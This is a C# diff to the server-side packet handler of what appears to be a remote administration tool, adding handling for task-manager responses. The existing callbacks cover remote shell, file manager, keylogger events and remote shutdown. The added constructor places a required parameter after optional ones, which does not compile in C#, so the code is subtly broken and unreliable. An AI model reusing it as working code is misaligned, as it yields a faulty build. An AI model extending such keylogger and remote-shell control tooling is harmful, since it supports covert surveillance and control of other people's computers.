@@ -15,8 +15,17 @@ namespace Server.Networking
         private readonly Action<KeyLoggerComboEvent>? _onKeyLoggerComboEvent;
         private readonly Action<MessageBoxResponse> _onMessageBoxResponse;
         private readonly Action<ShutdownActionResponse> _onShutdownActionResponse;
+        private readonly Action<TaskManagerResponse> _onTaskManagerResponse;
 
-        public PacketHandler(Action<SystemInfoResponse> onSystemInfoResponse, Action<RemoteShellResponse> onRemoteShellResponse, Action<FileManagerResponse> onFileManagerResponse, Action<MessageBoxResponse> onMessageBoxResponse, Action<ShutdownActionResponse> onShutdownActionResponse, Action<KeyLoggerEvent>? onKeyLoggerEvent = null, Action<KeyLoggerBatch>? onKeyLoggerBatch = null, Action<KeyLoggerComboEvent>? onKeyLoggerComboEvent = null)
+        public PacketHandler(Action<SystemInfoResponse> onSystemInfoResponse, 
+                             Action<RemoteShellResponse> onRemoteShellResponse, 
+                             Action<FileManagerResponse> onFileManagerResponse, 
+                             Action<MessageBoxResponse> onMessageBoxResponse, 
+                             Action<ShutdownActionResponse> onShutdownActionResponse, 
+                             Action<KeyLoggerEvent>? onKeyLoggerEvent = null, 
+                             Action<KeyLoggerBatch>? onKeyLoggerBatch = null, 
+                             Action<KeyLoggerComboEvent>? onKeyLoggerComboEvent = null,
+                             Action<TaskManagerResponse> onTaskManagerResponse)
         {
             _onSystemInfoResponse = onSystemInfoResponse;
             _onRemoteShellResponse = onRemoteShellResponse;
@@ -26,6 +35,7 @@ namespace Server.Networking
             _onKeyLoggerComboEvent = onKeyLoggerComboEvent;
             _onMessageBoxResponse = onMessageBoxResponse;
             _onShutdownActionResponse = onShutdownActionResponse;
+            _onTaskManagerResponse = onTaskManagerResponse;
         }
 
         public void HandleLine(string json)
@@ -88,6 +98,14 @@ namespace Server.Networking
                             _onShutdownActionResponse(sdResq);
                         }
                         break;
+                    
+                    case PacketType.TaskManagerResponse:
+						            var taskResp = JsonHelper.Deserialize<TaskManagerResponse>(json);
+						            if (taskResp != null)
+						            {
+							              _onTaskManagerResponse(taskResp);
+						            }
+						        break;
                     default:
                         break;
                 }
